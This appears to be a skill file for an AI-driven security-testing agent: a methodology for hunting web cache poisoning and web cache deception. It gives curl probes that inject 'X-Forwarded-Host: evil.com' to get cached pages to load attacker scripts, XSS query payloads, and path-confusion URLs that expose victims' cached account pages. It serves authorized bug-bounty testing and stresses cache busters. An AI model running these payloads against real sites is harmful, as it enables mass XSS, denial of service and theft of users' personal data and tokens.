---
name: cache-poisoning
description: "Web cache poisoning and web cache deception hunting — unkeyed header injection, XFH reflection, parameter cloaking, fat GET, cache key normalization; and for deception, the full discrepancy taxonomy (path mapping, delimiters, delimiter decoding, normalization by origin vs cache) against static-extension, static-directory, and exact-filename cache rules. Use when a target sits behind a CDN or cache, when X-Cache/Age headers are visible, or whenever an authenticated page might be reachable under a URL a cache considers static."
---

# Web Cache Poisoning & Cache Deception

## Crown Jewel Targets

- **CDN-fronted SaaS platforms** (Cloudflare/Akamai/Fastly) — X-Forwarded-Host reflected in `<script src>` → cached XSS affecting all users (Critical)
- **E-commerce product pages** with CDN caching — poisoned pricing/content pages, cache deception on checkout/account pages
- **Spring Boot applications** behind CDN — semicolon matrix variable path confusion for cache deception (`/profile;wcd.css`)
- **Rails applications** with CDN — dot format specifier confusion (`/profile.css` serves profile page, CDN caches as CSS)
- **Single-page apps** with JSON config/localization endpoints — DOM-based cache poisoning via poisoned JSON imports
- **OAuth/SSO callback pages** behind cache — poisoned redirect to attacker domain → token theft at scale
- **High-traffic landing pages** — cache poisoning DoS or defacement, mass phishing via poisoned links

## Attack Surface Signals

- **Response headers**: `Age:`, `X-Cache: HIT/MISS`, `CF-Cache-Status:`, `X-Varnish:`, `Fastly-Debug-Digest:`, `Cache-Control: max-age=`, `Vary:`
- **URL patterns**: Static asset paths (`/static/`, `/assets/`, `/cdn/`), product pages, landing pages with long cache TTL
- **Request header behavior**: Add `X-Forwarded-Host: evil.com` and check if reflected in response body/links
- **Tech stack signals**: CDN identified (CF-RAY, Akamai EdgeKey, X-Amz-Cf-Id), reverse proxy (Via header), cache control headers present
- **Positive indicators**: Response changes with unkeyed headers but cache key stays same, `Param-Miner` Burp extension finds unkeyed inputs
- **Cache deception signals**: Framework-specific path handling (Spring `;`, Rails `.format`, PHP path_info)

## Two Distinct Attacks

1. **Cache Poisoning**: Attacker makes CDN cache a malicious response → all users get poisoned content
2. **Cache Deception**: Attacker tricks victim into caching their sensitive data → attacker reads cached page

## Part 1: Cache Poisoning

### Detection — Find unkeyed inputs

```bash
# Test which headers affect response but aren't in cache key
# Param Miner (Burp extension) automates this

# Manual: inject unique value in headers, check if cached
curl -s "https://target.com/page" \
  -H "X-Forwarded-Host: evil.com" \
  -H "X-Forwarded-Scheme: nothttps" | grep "evil.com"

# Then fetch without header — if evil.com still appears, it's cached
curl -s "https://target.com/page" | grep "evil.com"
```

### Common unkeyed inputs
```
X-Forwarded-Host       → reflected in links/redirects
X-Forwarded-Scheme     → forces HTTP → redirect loop
X-Forwarded-Port       → reflected in URLs
X-Original-URL         → path override (Nginx, IIS)
X-Rewrite-URL          → path override
X-Forwarded-Prefix     → path prefix injection
Transfer-Encoding      → request smuggling → cache poisoning
Range                  → partial response caching
```

### Exploitation vectors

#### A. XSS via cache poisoning
```bash
# If X-Forwarded-Host reflected in <script src="//HOST/...">
curl "https://target.com/" -H "X-Forwarded-Host: evil.com"
# CDN caches: <script src="//evil.com/script.js">
# All users load attacker's JavaScript
```

#### B. DoS via cache poisoning
```bash
# Force error response into cache
curl "https://target.com/page" -H "X-Forwarded-Port: 1234"
# If this causes 400/500, and CDN caches it → DoS for all users
```

#### C. Cache key normalization abuse
```bash
# Parameter cloaking — different parsers treat ; vs & differently
# Ruby/Rails: ; is parameter separator
# CDN: ; is part of value (not in cache key)
https://target.com/page?innocent=1;evil_param=<script>alert(1)</script>
# CDN sees: 1 param (innocent=1;evil_param=...)
# App sees: 2 params (innocent=1, evil_param=<script>...)
```

## Part 2: Cache Deception

### How it works
```
1. Victim visits: https://target.com/account/settings (authenticated, personal data)
2. Attacker crafts URL: https://target.com/account/settings/nonexistent.css
3. CDN sees .css extension → caches the response (even though it's HTML with personal data)
4. Attacker fetches: https://target.com/account/settings/nonexistent.css → gets victim's data
```

### Testing cache deception
```bash
# Step 1: Login as victim, visit profile
curl -s "https://target.com/profile" -b "session=VICTIM_SESSION" | grep -i "email\|name\|address"

# Step 2: Try path confusion
curl -s "https://target.com/profile/x.css" -b "session=VICTIM_SESSION"
# If same content returned AND cached...

# Step 3: Fetch without auth (or different session)
curl -s "https://target.com/profile/x.css"
# If victim's data is returned → cache deception confirmed

# Extensions to try: .css .js .png .jpg .gif .ico .svg .woff
# Path variants: /profile/..%2fx.css  /profile%2fx.css  /profile;x.css
```

### Path confusion techniques
```
/account.css                    (dot in path)
/account/x.css                  (extra path segment)
/account%2fx.css                (encoded slash)
/account;x.css                  (semicolon — Tomcat path param)
/account\x.css                  (backslash — IIS)
/account/..%2f..%2faccount.css  (traversal back to same page)
```

### Cache buster — use one on every probe

Every test request must carry a unique parameter (`?cb=<random>`) so you never poison a real user's entry and never read a stale one. Without it you cannot tell your own cached response from the target's, and you risk a genuine denial of service on a live cache. This is non-negotiable on production targets.

### Detecting a cached response
```
X-Cache: hit | miss              # hit = served from cache
Age: 42                          # non-zero = cache stored it
Cache-Control: max-age=..., public
CF-Cache-Status / X-Drupal-Cache / X-Varnish
```
Send the same request twice: `miss` then `hit`, with response time dropping, means a cache rule applied to that path.

### The four discrepancy classes

Cache deception is always a **disagreement between how the cache maps a URL and how the origin maps it**. Work through them in order — each needs a different probe.

**1. Path mapping discrepancies** — the origin resolves `/api/orders/123/foo` to the `orders/123` handler and ignores the rest; the cache treats the whole path as a distinct static-looking resource.
```
/api/orders/123            → JSON with personal data, not cached
/api/orders/123/foo.js     → same JSON, now cached under a .js rule
```
Confirm the origin is actually ignoring the suffix (identical body) before blaming the cache.

**2. Delimiter discrepancies** — the origin truncates at a character the cache treats as part of the path. Candidates vary by framework: `;` `,` `%3F` `%23` `?` `%2F` `%00` `.` `&` and newline/tab encodings.
```
/account;foo.css      Java/Tomcat treats ; as a path-parameter delimiter
/account%23foo.css    origin decodes %23 to # and truncates; cache does not
```
Test each delimiter individually against a known authenticated page and compare the body to the clean request.

**3. Delimiter decoding discrepancies** — both sides accept the delimiter, but only one **decodes** it first. The cache sees the literal `%23` as path text while the origin decodes it to `#` and stops there. This is the subtlest class and the one most often missed; it needs encoded and decoded variants of every delimiter tested separately.

**4. Normalization discrepancies** — cache and origin resolve dot-segments differently.
```
/static/..%2faccount        origin normalizes to /account (personal data)
                            cache keeps the literal path → matches the /static/ rule
```
Determine *which side* normalizes before exploiting:
- **Origin normalizes?** Request `/aaa/..%2faccount` with a cache buster; if you get account content back, the origin resolved it.
- **Cache normalizes?** Request a path that only matches a cache rule after normalization and watch for `X-Cache: hit`.

The exploit direction is opposite in each case, so establishing this first saves a lot of wasted probing.

### Cache rule types to target

- **Static extension rules** — `.css .js .png .ico .svg .woff` appended via any discrepancy above
- **Static directory rules** — `/static/`, `/assets/`, `/scripts/`, `/images/` reached by traversal from a dynamic page
- **File name rules** — exact-match caching of well-known files: `/robots.txt`, `/favicon.ico`, `/index.html`, `/sitemap.xml`. If the cache matches on the *exact filename anywhere in the path*, a delimiter gets you `/account;robots.txt` cached under that rule

### Impact discipline

Deception is only a finding when you retrieve **another user's** data from the cache. Caching your own response proves the rule exists, not that anything leaks. The PoC needs: victim session visits the crafted URL, attacker fetches the same URL unauthenticated, attacker receives victim data — all with the cache buster removed only at the final step, and the entry allowed to expire afterwards.

## CDN-Specific Behavior

| CDN | Cache Key | Notable Behavior |
|-----|-----------|-----------------|
| Cloudflare | Host + Path + Query | Normalizes path, caches by extension rules |
| Akamai | Configurable | Sureroute, edge key transform |
| Fastly | VCL-defined | vcl_hash customizable |
| CloudFront | Configurable | Forwarded headers policy |
| Varnish | VCL-defined | Default: Host + URL |
| Nginx proxy_cache | `proxy_cache_key` | Default: scheme + host + request_uri |

## Completing the poisoning chain

Finding an unkeyed input is only step one of three. Skipping either of the remaining steps produces a report that a triager cannot reproduce.

**1. Identify and evaluate unkeyed inputs** — Param Miner, or manual header injection with a cache buster on every request.

**2. Elicit a harmful response from the back-end server.** An unkeyed header that is merely reflected is not yet a vulnerability. Establish what the reflection can do: does it land in a `<script src>` (script import hijack), in a redirect target, in a cookie, or is it enough to force an error the cache will store (DoS)? If the reflected value is HTML-encoded and lands in a harmless position, the unkeyed input is a curiosity, not a finding.

**3. Get the response cached.** Timing matters — you must land your request when the cache is due to store a fresh copy, and confirm with `X-Cache: hit`/`Age` on a *clean* request without your header. Only that final clean request proves other users are served the poisoned copy.

**Using multiple headers.** Some exploits need two or more unkeyed inputs together — `X-Forwarded-Host` to control the domain plus `X-Forwarded-Scheme` to force the redirect that triggers the fetch. Param Miner finds inputs one at a time, so test promising pairs manually.

**Unkeyed query string, and unkeyed port.** The whole query string is sometimes excluded from the cache key, which means `?utm_content=<payload>` poisons the base URL. Likewise `X-Forwarded-Port` is often unkeyed and can force an error response into the cache. Also test whether *specific* parameters are excluded — that is parameter cloaking's close relative.

**Poisoning internal caches.** Not every cache is at the edge. Application-level and framework caches sit behind the CDN and are keyed differently, so an input the CDN keys on may still be unkeyed internally. Symptoms: a response that varies for other users but not for the CDN, or `Age`/cache headers appearing only on origin-direct requests.

## Impact Requirements

### Cache Poisoning
- **XSS via poisoned page**: All users affected → Critical
- **DoS via error caching**: Service disruption → High
- **Redirect poisoning**: Phishing at scale → High

### Cache Deception
- **PII theft**: Read victim's profile data → High
- **Token theft**: Read victim's API tokens from cached page → Critical
- **Session theft**: Read session data → Critical

## Triage Checklist

- [ ] Unkeyed input identified (header/param that affects response but not cache key)
- [ ] Cache confirmed (response has Age, X-Cache-Hit, or CF-Cache-Status headers)
- [ ] Poisoned/deceived response served to different user/session
- [ ] Impact demonstrated (XSS, data theft, not just "header reflected")
- [ ] Reproducible (not one-time cache hit)
- [ ] Specific CDN/caching layer identified

## PortSwigger Academy — Advanced Techniques

### Cache Parameter Cloaking via Semicolons (Rails)
- Rails treats `;` as a parameter delimiter, but most caches do not
- `?cb=abc&excluded=x;cb=evil` — cache keys the full string (one param), Rails parses `cb=evil` (second occurrence wins)
- Bypass cache-excluded parameters by hiding them after a semicolon within an included parameter

### Fat GET Requests
- Send a GET request with a body + `X-HTTP-Method-Override: POST` header
- Cache keys the URL (GET), but the backend reads the body (processes as POST)
- Poison the cache with response influenced by POST body parameters that aren't in the cache key

### Normalized Cache Key Exploit
- Cache normalizes (URL-decodes) the path before keying, but serves the original response
- Send unencoded XSS in URL path (via Burp, bypassing browser encoding): `/post?q=<script>alert(1)</script>`
- Cache stores it under the same key as the browser's encoded request `/post?q=%3Cscript%3Ealert(1)%3C/script%3E`
- Normal browser requests receive the poisoned response

### Cache Key Injection via Delimiter
- Some caches use internal delimiters in the key: `Origin: x][-]alert(1)-[`
- The injected value collides with another cache key entry, poisoning responses for different origins
- Requires knowledge of the cache's internal key format (observable via cache behavior)

### Unkeyed Port Injection
- `Host: victim.com:1337` — port may be stripped from cache key but reflected in response URLs
- Cache serves the poisoned response (with `:1337` in URLs) for requests to `victim.com` (without port)
- Reflected port in `<script src="//victim.com:1337/resources/...">` → attacker-controlled resource load

### DOM-Based Cache Poisoning via JSON Import
- Poison a JSON response imported by client-side JavaScript (e.g., localization file, config endpoint)
- Requires `Access-Control-Allow-Origin: *` on attacker server for cross-origin JSON import
- Injected content in cached JSON triggers DOM XSS when the page's JavaScript processes it

### Vary Header Targeting
- Poison cache for specific `User-Agent` subsets — target mobile browsers, specific bot crawlers, or internal tool signatures
- `Vary: User-Agent` means each UA gets its own cached copy — poison only the targeted variant

### Web Cache Deception — Framework Delimiters
- **Spring**: `/profile;wcd.css` — semicolon starts matrix variable (ignored by Spring, treated as static by cache)
- **Rails**: `/profile.css` — dot starts format specifier (Rails serves profile page, cache sees `.css`)
- **OpenLiteSpeed**: `/profile%00wcd.css` — null byte terminates path for origin, cache sees `.css` extension

### WCD — Encoded Hash Bypass
- `/profile%23wcd.css` — origin URL-decodes `%23` to `#` (fragment, ignored → serves `/profile`)
- Cache does NOT decode and sees the full path with `.css` → caches the authenticated response
- Attacker fetches `/profile%23wcd.css` unauthenticated → receives victim's cached profile data

### WCD — Static Directory Traversal
- `/assets/..%2fprofile` — cache matches `/assets/` prefix (static directory rule → cache it)
- Origin normalizes `..%2f` to `../` and resolves to `/profile` (serves authenticated content)
- Cache stores the dynamic authenticated response as a "static asset"

## Operator Notes (Battle-Tested)

1. **Param Miner (Burp extension) is essential**: It automates unkeyed input discovery across headers, cookies, and query params. Run it on every CDN-fronted target before manual testing. Most cache poisoning findings start with Param Miner output.
2. **Use cache busters on every test request**: Append `?cb=RANDOM` to avoid poisoning real cache entries during testing. Only remove the cache buster when you need to prove the poisoning works on the canonical URL. Programs will be angry if you poison their production cache.
3. **Cache deception is easier to find than cache poisoning**: You do not need an unkeyed input — just path confusion. Test `/account/settings/x.css`, `/account;x.css`, `/account%23x.css` on every authenticated page. If the page content is returned AND cached, you have a finding.
4. **Verify the cache layer, not just the response**: Check `Age:` header incrementing, `X-Cache: HIT` on second request, or `CF-Cache-Status: HIT`. Without proof that the response is cached, the finding is incomplete.
5. **Fat GET with `X-HTTP-Method-Override: POST` is underexplored**: Many frameworks process the request body on GET when this header is present, but caches key only the URL. Poison the cache with POST-body-influenced responses.

## Related Skills & Chains

| When | Go to |
|------|-------|
| Need request smuggling to poison cache | `request-smuggling` |
| X-Forwarded-Host reflected but not cached | `host-header-attacks` |
| Poisoned JSON triggers DOM XSS | `xss-testing` |
| Cache deception leaks OAuth tokens | `oauth-testing` |
| CDN-specific bypass needed | `waf-bypass` |
| CORS misconfiguration + cache poisoning chain | `cors-testing` |
